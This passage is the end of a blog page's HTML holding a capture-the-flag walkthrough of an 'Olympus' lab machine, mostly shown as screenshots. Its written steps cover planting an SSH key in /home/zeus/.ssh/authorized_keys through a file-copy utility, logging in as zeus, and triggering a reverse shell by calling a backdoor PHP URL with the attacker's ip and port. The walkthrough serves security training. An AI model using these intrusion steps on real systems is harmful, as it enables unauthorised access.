+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2019.png"
+        title="Untitled"></p>
+<p><strong>Copy the id_rsa.pub to the victim machine</strong>.</p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2020.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2020.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2020.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2020.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2020.png"
+        title="Untitled"></p>
+<p><strong>Overwrite:-</strong></p>
+<p><strong>Run the cputils and Select the id_rsa.pub and set the target to /home/zeus/.ssh/authorized_keys</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2021.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2021.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2021.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2021.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2021.png"
+        title="Untitled"></p>
+<p><strong>ssh login as zeus:-</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2022.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2022.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2022.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2022.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2022.png"
+        title="Untitled"></p>
+<h2 id="root-" class="headerLink">
+    <a href="#root-" class="header-mark"></a>Root:-</h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2023.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2023.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2023.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2023.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2023.png"
+        title="Untitled"></p>
+<p><strong>Let’s Visit the php page:-</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2024.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2024.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2024.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2024.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2024.png"
+        title="Untitled"></p>
+<p><strong>Login using the password which found inside the php file.</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2025.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2025.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2025.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2025.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2025.png"
+        title="Untitled"></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2026.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2026.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2026.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2026.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2026.png"
+        title="Untitled"></p>
+<p><strong>Start Listener:-</strong></p>
+<p>Set Ip=[your ip]&amp;port=[listener port]</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://10.10.194.107/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.18.8.246<span class="err">&amp;</span>port=4321
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2027.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2027.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2027.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2027.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2027.png"
+        title="Untitled"></p>
+<p><strong>We got shell:-</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2028.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2028.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2028.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2028.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2028.png"
+        title="Untitled"></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2029.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2029.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2029.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2029.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2029.png"
+        title="Untitled"></p>
+</div><div id="comments"></div></div></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.13"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">CIGAR</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/fuse/fuse.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/topbar/topbar.min.js"></script><script type="text/javascript" src="/lib/pjax/pjax.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+
+<div class="pjax-assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"desktop-header-typeit":"CIGAR#","mobile-header-typeit":"CIGAR#"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript></div>
+</body>
+
+</html>
